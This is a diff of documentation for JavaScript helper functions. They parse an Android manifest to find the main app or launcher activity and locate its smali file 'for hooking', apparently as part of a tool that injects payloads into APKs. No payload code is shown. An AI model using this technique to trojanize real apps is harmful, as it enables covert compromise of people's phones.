@@ -5,30 +5,36 @@
 // function to locate the Main Hookable Smali Class file
 // after it has been extracted from the manifest
 function GetLauncherPath(launcherActivity, apkFolder, callback) {
-  let found = false;
-  let launcherPath = null;
-  readdirp(apkFolder, { fileFilter: launcherActivity, alwaysStat: true })
-    .on('data', (entry) => {
-      found = true;
-      var { path, stats: {} } = entry;
-      var output = `${JSON.stringify(path)}`;
-      if (process.platform === 'win32') {
-        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
-      } else {
-        (process.platform === 'linux' || process.platform === 'darwin');
-        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
-      }
+    let found = false;
+    let launcherPath = null;
+    readdirp(apkFolder, {
+        fileFilter: launcherActivity, alwaysStat: true
     })
-    .on('end', () => {
-      if (!found) {
-        callback(`The LauncherActivity was not found in ${apkFolder}`);
-      } else {
-        callback(null, launcherPath);
-      }
-    })
-    .on('error', (err) => {
-      callback(err);
-    });
+        .on('data', (entry) => {
+            found = true;
+            var {
+                path, stats: { }
+            } = entry;
+            var output = `${JSON.stringify(path)}`;
+            if (process.platform === 'win32') {
+                launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
+            } else {
+                launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
+            }
+        })
+        .on('end',
+            () => {
+                if (!found) {
+                    callback('[x] Unable to Locate the Hookable Smali Class File!', CONSTANTS.logStatus.FAIL);
+                    callback('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
+                } else {
+                    callback(null, launcherPath);
+                }
+            })
+        .on('error',
+            (err) => {
+                callback(err);
+            });
 }
 ```
 
@@ -36,7 +42,6 @@ function GetLauncherPath(launcherActivity, apkFolder, callback) {
 > Supersedes the old GetLauncherActivity function by uysing xml2js to extract the name of the main hookable class and return it as a smali file
 > > Used with the Recursive File Search function below.
 ```js
-//function to extract the launcher activity from the orginal app
 function GetLauncherActivity(manifest) {
 
     const application = manifest['manifest']['application'][0];
@@ -48,7 +53,7 @@ function GetLauncherActivity(manifest) {
         if (mainApplicationClassName.startsWith('.')) {
             mainApplicationClassName = mainApplicationClassName.slice(1);
         }
-        setTimeout(() => console.log('[★] [¡] Scoped the Main App Class for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
         return mainApplicationClassName + '.smali';
     }
 
@@ -71,7 +76,7 @@ function GetLauncherActivity(manifest) {
         if (mainActivityClassName.startsWith('.')) {
             mainActivityClassName = mainActivityClassName.slice(1);
         }
-        setTimeout(() => console.log('[★] [¡] Scoped the Main Launcher Activity for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
         return mainActivityClassName + '.smali';
     }
 
@@ -94,7 +99,7 @@ function GetLauncherActivity(manifest) {
         if (targetActivityName.startsWith('.')) {
             targetActivityName = targetActivityName.slice(1);
         }
-        setTimeout(() => console.log('[★] [¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
         return targetActivityName + '.smali';
     }
 
@@ -158,7 +163,7 @@ function GetLauncherActivity(manifest) {
         if (mainApplicationClassName.startsWith('.')) {
             mainApplicationClassName = mainApplicationClassName.slice(1);
         }
-        setTimeout(() => console.log('[★] [¡] Scoped the Main App Class for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main App Class for Hooking...', CONSTANTS.logStatus.INFO);
         return mainApplicationClassName + '.smali';
     }
 
@@ -181,7 +186,7 @@ function GetLauncherActivity(manifest) {
         if (mainActivityClassName.startsWith('.')) {
             mainActivityClassName = mainActivityClassName.slice(1);
         }
-        setTimeout(() => console.log('[★] [¡] Scoped the Main Launcher Activity for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
         return mainActivityClassName + '.smali';
     }
 
@@ -204,7 +209,7 @@ function GetLauncherActivity(manifest) {
         if (targetActivityName.startsWith('.')) {
             targetActivityName = targetActivityName.slice(1);
         }
-        setTimeout(() => console.log('[★] [¡] Scoped the Main Launcher Activity in an Alias for Hooking...\n'), 1000);
+        delayedLog('[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking...', CONSTANTS.logStatus.INFO);
         return targetActivityName + '.smali';
     }
 
@@ -213,30 +218,36 @@ function GetLauncherActivity(manifest) {
 }
 
 function GetLauncherPath(launcherActivity, apkFolder, callback) {
-  let found = false;
-  let launcherPath = null;
-  readdirp(apkFolder, { fileFilter: launcherActivity, alwaysStat: true })
-    .on('data', (entry) => {
-      found = true;
-      var { path, stats: { } } = entry;
-      var output = `${JSON.stringify(path)}`;
-      if (process.platform === 'win32') {
-        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
-      } else {
-        (process.platform === 'linux' || process.platform === 'darwin');
-        launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
-      }
+    let found = false;
+    let launcherPath = null;
+    readdirp(apkFolder, {
+        fileFilter: launcherActivity, alwaysStat: true
     })
-    .on('end', () => {
-      if (!found) {
-        callback(`The LauncherActivity was not found in ${apkFolder}`);
-      } else {
-        callback(null, launcherPath);
-      }
-    })
-    .on('error', (err) => {
-      callback(err);
-    });
+        .on('data', (entry) => {
+            found = true;
+            var {
+                path, stats: { }
+            } = entry;
+            var output = `${JSON.stringify(path)}`;
+            if (process.platform === 'win32') {
+                launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\\/g, "/").replace(/\n$/, '');
+            } else {
+                launcherPath = output.replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
+            }
+        })
+        .on('end',
+            () => {
+                if (!found) {
+                    callback('[x] Unable to Locate the Hookable Smali Class File!', CONSTANTS.logStatus.FAIL);
+                    callback('[x] Please Use the "On Boot" Method!', CONSTANTS.logStatus.FAIL);
+                } else {
+                    callback(null, launcherPath);
+                }
+            })
+        .on('error',
+            (err) => {
+                callback(err);
+            });
 }
 ```
 ## Smali Payload Directory Creation Function 
